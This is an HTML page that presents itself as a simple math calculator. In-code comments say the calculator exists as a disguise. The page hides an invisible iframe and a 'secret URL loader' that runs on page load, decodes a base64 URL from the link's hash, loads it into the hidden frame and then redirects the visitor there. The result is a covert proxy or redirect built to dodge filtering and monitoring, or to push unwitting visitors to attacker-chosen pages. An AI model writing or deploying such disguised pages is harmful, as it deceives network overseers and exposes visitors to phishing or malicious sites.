<!DOCTYPE html>
<html>
<head>
    <title>Math Calculator</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; }
        #calculator { margin: 20px auto; padding: 20px; border: 1px solid #ccc; max-width: 500px; }
        #result { font-size: 24px; margin: 20px; }
        #hidden-frame { display: none; }
    </style>
</head>
<body>
    <h1>Advanced Math Calculator</h1>
    <div id="calculator">
        <input type="number" id="num1" placeholder="Enter number">
        <select id="operator">
            <option value="add">+</option>
            <option value="subtract">-</option>
        </select>
        <input type="number" id="num2" placeholder="Enter number">
        <button onclick="calculate()">Calculate</button>
        <div id="result"></div>
    </div>

    <!-- Hidden proxy mechanism -->
    <iframe id="hidden-frame" sandbox="allow-scripts allow-same-origin"></iframe>

    <script>
        // Real calculator function (for disguise)
        function calculate() {
            const num1 = parseFloat(document.getElementById('num1').value);
            const num2 = parseFloat(document.getElementById('num2').value);
            const operator = document.getElementById('operator').value;
            
            let result;
            if (operator === 'add') result = num1 + num2;
            else result = num1 - num2;
            
            document.getElementById('result').innerText = `Result: ${result}`;
        }

        // Secret URL loader (trigger via URL hash)
        window.onload = function() {
            const hash = window.location.hash.substring(1);
            if (hash) {
                const decoded = atob(hash);
                document.getElementById('hidden-frame').src = decoded;
                
                // Optional: Auto-redirect after delay
                setTimeout(() => {
                    window.location = decoded;
                }, 3000);
            }
        };
    </script>
</body>
</html>
